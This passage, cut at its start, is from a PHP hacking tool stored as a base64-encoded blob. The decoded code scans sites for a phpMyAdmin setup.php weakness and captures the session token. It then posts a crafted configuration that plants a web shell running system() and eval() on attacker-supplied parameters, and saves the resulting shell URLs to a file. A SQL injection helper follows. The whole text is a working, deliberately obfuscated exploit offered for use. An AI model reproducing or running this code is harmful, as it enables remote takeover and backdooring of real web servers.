3VybF9zZXRvcHQoJGNoMiwgQ1VSTE9QVF9IRUFERVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoMiwgQ1VSTE9QVF9VUkwsICR1cmwuImNvbmZpZy9jb25maWcuaW5jLnBocCIpOwogICAgJHJlc3VsdDIgPSBjdXJsX2V4ZWMoJGNoMik7CiAgICBjdXJsX2Nsb3NlKCRjaDIpOwogICAgLy9wcmludCAkdXJsOwogICAgaWYgKHByZWdfbWF0Y2goIi8yMDAgT0svIiwgJHJlc3VsdCkgYW5kIHByZWdfbWF0Y2goIi90b2tlbi8iLCAkcmVzdWx0KSBhbmQgcHJlZ19tYXRjaCgiLzIwMCBPSy8iLCAkcmVzdWx0MikpIHsKICAgICAgICBwcmludCAiXG5bIV0gdzAwdCEgdzAwdCEgRm91bmQgcG9zc2libGUgcGhwTXlBZG1pbiB2dWxuIjsKICAgICAgICBwcmludCAiXG5bLV0gRXhwbG9pdGluZywgd2FpdCBzZWMuLlxuIjsKICAgICAgICBwaHBteWFkbWluX2V4cGxvaXQoJHVybCk7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBwcmludCAiXG5bLV0gU2hpdCEgbm8gbHVjay4uIG5vdCB2dWxuZXJhYmxlXG4iOwogICAgfQp9CgpmdW5jdGlvbiBwaHBteWFkbWluX2V4cGxvaXQoJHcwMHQpIHsKICAgICAgICAkdXNlcmFnZW50ID0gIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuOC4xLjIwKSBHZWNrby8yMDA4MTIxNyBGaXJlZm94LzIuMC4wLjIwICguTkVUIENMUiAzLjUuMzA3MjkpICI7IC8vZmlyZWZveCAKICAgICAgICAvL2ZpcnN0IGdldCBjb29raWUgKyB0b2tlbiAKICAgICAgICAkY3VybCA9IGN1cmxfaW5pdCgpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICR3MDB0LiJzY3JpcHRzL3NldHVwLnBocCIpOyAvL1VSTCAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULDIwKTsKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCBmYWxzZSk7ICAgICAgICAgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyAvL3JldHVybiBzaXRlIGFzIHN0cmluZyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAiZXhwb2l0Y29va2llLnR4dCIpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9DT09LSUVKQVIsICJleHBsb2l0Y29va2llLnR4dCIpOyAKICAgICAgICAkcmVzdWx0ID0gY3VybF9leGVjKCRjdXJsKTsKICAgICAgICBjdXJsX2Nsb3NlKCRjdXJsKTsKICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi90b2tlblwiXHMrdmFsdWU9XCIoW14+XSs/KVwiLyIsICRyZXN1bHQsICRtYXRjaGVzKSk7CiAgICAgICAgCiAgICAgICAgJHRva2VuID0gJG1hdGNoZXNbMV1bMV07CiAgICAgICAgaWYgKCR0b2tlbiAhPSAnJykgewogICAgICAgIHByaW50ICJcblshXSB3MDB0ISB3MDB0ISBHb3QgdG9rZW4gPSAiIC4gJG1hdGNoZXNbMV1bMV07CiAgICAgICAgJHBheWxvYWQgPSAidG9rZW49Ii4kdG9rZW4uIiZhY3Rpb249c2F2ZSZjb25maWd1cmF0aW9uPWE6MTp7czo3OiUyMlNlcnZlcnMlMjIlM2JhOjE6e2k6MCUzYmE6Njp7czoxMzY6JTIyaG9zdCUyNyU1ZD0lMjclMjclM2IlMjBpZihcJF9HRVQlNWIlMjdjJTI3JTVkKXtlY2hvJTIwJTI3JTNjcHJlJTNlJTI3JTNic3lzdGVtKFwkX0dFVCU1YiUyN2MlMjclNWQpJTNiZWNobyUyMCUyNyUzYy9wcmUlM2UlMjclM2J9aWYoXCRfR0VUJTViJTI3cCUyNyU1ZCl7ZWNobyUyMCUyNyUzY3ByZSUzZSUyNyUzYmV2YWwoXCRfR0VUJTViJTI3cCUyNyU1ZCklM2JlY2hvJTIwJTI3JTNjL3ByZSUzZSUyNyUzYn0lM2IvLyUyMiUzYnM6OTolMjJsb2NhbGhvc3QlMjIlM2JzOjk6JTIyZXh0ZW5zaW9uJTIyJTNiczo2OiUyMm15c3FsaSUyMiUzYnM6MTI6JTIyY29ubmVjdF90eXBlJTIyJTNiczozOiUyMnRjcCUyMiUzYnM6ODolMjJjb21wcmVzcyUyMiUzYmI6MCUzYnM6OTolMjJhdXRoX3R5cGUlMjIlM2JzOjY6JTIyY29uZmlnJTIyJTNiczo0OiUyMnVzZXIlMjIlM2JzOjQ6JTIycm9vdCUyMiUzYn19fSZlb2x0eXBlPXVuaXgiOwogICAgICAgIHByaW50ICJcblstXSBTZW5kaW5nIGV2aWwgcGF5bG9hZCBtd2FoYWhhLi4gXG4iOwogICAgICAgICRjdXJsID0gY3VybF9pbml0KCk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJHcwMHQuInNjcmlwdHMvc2V0dXAucGhwIik7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsMjApOwogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFRkVSRVIsICR3MDB0KTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRwYXlsb2FkKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfQ09PS0lFRklMRSwgImV4cG9pdGNvb2tpZS50eHQiKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfQ09PS0lFSkFSLCAiZXhwbG9pdGNvb2tpZS50eHQiKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDMpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIEZBTFNFKTsgCiAgICAgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY3VybCk7CiAgICAgICAgY3VybF9jbG9zZSgkY3VybCk7CiAgICAgICAgCiAgICAgICAgcHJpbnQgIlxuWyFdIHcwMHQhIHcwMHQhIFlvdSBzaG91bGQgbm93IGhhdmUgc2hlbGwgaGVyZSI7CiAgICAgICAgcHJpbnQgIlxuWytdICIuJHcwMHQuImNvbmZpZy9jb25maWcuaW5jLnBocD9jPWlkIFxuIjsKICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygncG1hc2hlbGwudHh0JywgJHcwMHQuImNvbmZpZy9jb25maWcuaW5jLnBocD9jPWlkXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgIlxuWyFdIFNoaXQhIG5vIGx1Y2suLiBub3QgdnVsbmVyYWJsZVxuIjsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBwcmludCAiU2VlICdwbWFzaGVsbC50eHQnIGZvciB0aGUgbGlzdFxuIjsKICAgICAgICBpZiAoZmlsZV9leGlzdHMoJ2V4cGxvaXRjb29raWUudHh0JykpIHsgdW5saW5rKCdleHBsb2l0Y29va2llLnR4dCcpOyB9CiAgICB9CgoKCmZ1bmN0aW9uIGluamVjdG9yKCkgewogICAgICAgIAogICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1VUkw6ICIpOwogICAgICAgICR1cmwgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgZndyaXRlKFNURE9VVCwgIlxuLVVSTCBFbmRpbmcgKC0tIG9yIC8qKTogIik7CiAgICAgICAgJGVuZCA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICAgICBpZighcHJlZ19tYXRjaCgiL2RhcmtjMGRlLyIsICR1cmwpKSB7CiAgICAgICAgICAgIHByaW50ICJbLV0gUGxlYXNlIGluc2VydCAnZGFya2MwZGUnIHRva2VuIG9uIHRoZSBVUkxcbiI7CiAgICAgICAgICAgIHByaW50ICJbLV0gRXhhbXBsZTogaHR0cDovL3NpdGUuY29tL25ld3MucGhwP2lkPWRhcmtjMGRlXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEV4YW1wbGU6IGh0dHA6Ly9zaXRlLmNvbS9pbmRleC5waHA



"))

?>
